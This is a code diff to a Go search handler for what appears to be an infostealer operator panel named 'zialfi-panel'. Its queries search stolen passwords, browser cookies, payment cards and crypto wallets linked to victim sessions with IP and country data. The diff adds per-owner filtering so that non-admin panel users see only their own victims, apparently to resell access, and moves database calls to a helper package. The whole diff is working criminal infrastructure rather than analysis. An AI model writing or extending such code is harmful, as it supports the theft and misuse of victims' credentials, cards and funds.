@@ -7,12 +7,12 @@ import (
 	"strconv"
 	"strings"
 
-	"zialfi-panel/internal/services"
+	"zialfi-panel/internal/db"
+	"zialfi-panel/internal/middleware"
 )
 
 type SearchHandler struct {
-	db      *sql.DB
-	logProc *services.LogProcessor
+	db *sql.DB
 }
 
 func NewSearchHandler(db *sql.DB) *SearchHandler {
@@ -53,6 +53,13 @@ func (h *SearchHandler) Search(w http.ResponseWriter, r *http.Request) {
 	like := "%" + q + "%"
 	offset := (page - 1) * perPage
 
+	ownerClause := ""
+	var ownerArg any
+	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
+		ownerClause = " AND s.owner_id = ?"
+		ownerArg = claims.UserID
+	}
+
 	type queryDef struct {
 		name  string
 		query string
@@ -60,14 +67,14 @@ func (h *SearchHandler) Search(w http.ResponseWriter, r *http.Request) {
 	}
 
 	queries := []queryDef{
-		{"password", "SELECT p.session_id, 'password', p.url, p.username, s.created_at FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?",
-			"SELECT COUNT(*) FROM passwords WHERE url LIKE ? OR username LIKE ? OR password_value LIKE ?"},
-		{"cookie", "SELECT c.session_id, 'cookie', c.name, c.domain, s.created_at FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE c.name LIKE ? OR c.domain LIKE ? OR c.value LIKE ?",
-			"SELECT COUNT(*) FROM cookies WHERE name LIKE ? OR domain LIKE ? OR value LIKE ?"},
-		{"card", "SELECT c.session_id, 'card', c.holder, c.number, s.created_at FROM cards c JOIN sessions s ON s.id = c.session_id WHERE c.holder LIKE ? OR c.number LIKE ?",
-			"SELECT COUNT(*) FROM cards WHERE holder LIKE ? OR number LIKE ?"},
-		{"wallet", "SELECT w.session_id, 'wallet', w.name, w.path, s.created_at FROM wallets w JOIN sessions s ON s.id = w.session_id WHERE w.name LIKE ?",
-			"SELECT COUNT(*) FROM wallets WHERE name LIKE ?"},
+		{"password", "SELECT p.session_id, 'password', p.url, p.username, s.created_at FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE (p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?)" + ownerClause,
+			"SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE (p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?)" + ownerClause},
+		{"cookie", "SELECT c.session_id, 'cookie', c.name, c.domain, s.created_at FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE (c.name LIKE ? OR c.domain LIKE ? OR c.value LIKE ?)" + ownerClause,
+			"SELECT COUNT(*) FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE (c.name LIKE ? OR c.domain LIKE ? OR c.value LIKE ?)" + ownerClause},
+		{"card", "SELECT c.session_id, 'card', c.holder, c.number, s.created_at FROM cards c JOIN sessions s ON s.id = c.session_id WHERE (c.holder LIKE ? OR c.number LIKE ?)" + ownerClause,
+			"SELECT COUNT(*) FROM cards c JOIN sessions s ON s.id = c.session_id WHERE (c.holder LIKE ? OR c.number LIKE ?)" + ownerClause},
+		{"wallet", "SELECT w.session_id, 'wallet', w.name, w.path, s.created_at FROM wallets w JOIN sessions s ON s.id = w.session_id WHERE w.name LIKE ?" + ownerClause,
+			"SELECT COUNT(*) FROM wallets w JOIN sessions s ON s.id = w.session_id WHERE w.name LIKE ?" + ownerClause},
 	}
 
 	switch typ {
@@ -99,13 +106,16 @@ func (h *SearchHandler) Search(w http.ResponseWriter, r *http.Request) {
 			case "wallet":
 				queryArgs = []any{like}
 			}
+			if ownerClause != "" {
+				queryArgs = append(queryArgs, ownerArg)
+			}
 			var subTotal int
-			h.db.QueryRow(qd.count, queryArgs...).Scan(&subTotal)
+			db.QueryRow(h.db, qd.count, queryArgs...).Scan(&subTotal)
 			total += subTotal
 
 			if subTotal > 0 {
 				qargs := append(queryArgs, perPage, offset)
-				rows, err := h.db.Query(qd.query+" ORDER BY s.created_at DESC LIMIT ? OFFSET ?", qargs...)
+				rows, err := db.Query(h.db, qd.query+" ORDER BY s.created_at DESC LIMIT ? OFFSET ?", qargs...)
 				if err != nil {
 					continue
 				}
@@ -172,6 +182,11 @@ func (h *SearchHandler) AdvancedSearch(w http.ResponseWriter, r *http.Request) {
 		args = append(args, dateTo+" 23:59:59")
 	}
 
+	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
+		conditions = append(conditions, "s.owner_id = ?")
+		args = append(args, claims.UserID)
+	}
+
 	sessionWhere := ""
 	if len(conditions) > 0 {
 		sessionWhere = " AND " + strings.Join(conditions, " AND ")
@@ -179,14 +194,14 @@ func (h *SearchHandler) AdvancedSearch(w http.ResponseWriter, r *http.Request) {
 
 	countQuery := "SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1" + sessionWhere
 	var total int
-	h.db.QueryRow(countQuery, args...).Scan(&total)
+	db.QueryRow(h.db, countQuery, args...).Scan(&total)
 
 	offset := (page - 1) * perPage
 	dataQuery := fmt.Sprintf(`SELECT p.session_id, p.url, p.username, p.password_value, p.browser, s.os, s.ip, s.country_code, s.created_at
 		FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1%s ORDER BY s.created_at DESC LIMIT ? OFFSET ?`, sessionWhere)
 	qargs := append(args, perPage, offset)
 
-	rows, err := h.db.Query(dataQuery, qargs...)
+	rows, err := db.Query(h.db, dataQuery, qargs...)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "search failed")
 		return
@@ -242,7 +257,7 @@ func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []a
 		whereClause = " WHERE 1=1 " + sessionWhere
 	}
 
-	rows, err := h.db.Query("SELECT p.browser, COUNT(*) as cnt FROM passwords p JOIN sessions s ON s.id = p.session_id"+whereClause+" GROUP BY p.browser ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows, err := db.Query(h.db, "SELECT p.browser, COUNT(*) as cnt FROM passwords p JOIN sessions s ON s.id = p.session_id"+whereClause+" GROUP BY p.browser ORDER BY cnt DESC LIMIT 10", sessionArgs...)
 	if err == nil {
 		defer rows.Close()
 		for rows.Next() {
@@ -254,7 +269,7 @@ func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []a
 		}
 	}
 
-	rows2, err := h.db.Query("SELECT s.os, COUNT(*) as cnt FROM sessions s"+whereClause+" GROUP BY s.os ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows2, err := db.Query(h.db, "SELECT s.os, COUNT(*) as cnt FROM sessions s"+whereClause+" GROUP BY s.os ORDER BY cnt DESC LIMIT 10", sessionArgs...)
 	if err == nil {
 		defer rows2.Close()
 		for rows2.Next() {
@@ -266,7 +281,7 @@ func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []a
 		}
 	}
 
-	rows3, err := h.db.Query("SELECT c.domain, COUNT(*) as cnt FROM cookies c JOIN sessions s ON s.id = c.session_id"+whereClause+" GROUP BY c.domain ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows3, err := db.Query(h.db, "SELECT c.domain, COUNT(*) as cnt FROM cookies c JOIN sessions s ON s.id = c.session_id"+whereClause+" GROUP BY c.domain ORDER BY cnt DESC LIMIT 10", sessionArgs...)
 	if err == nil {
 		defer rows3.Close()
 		for rows3.Next() {
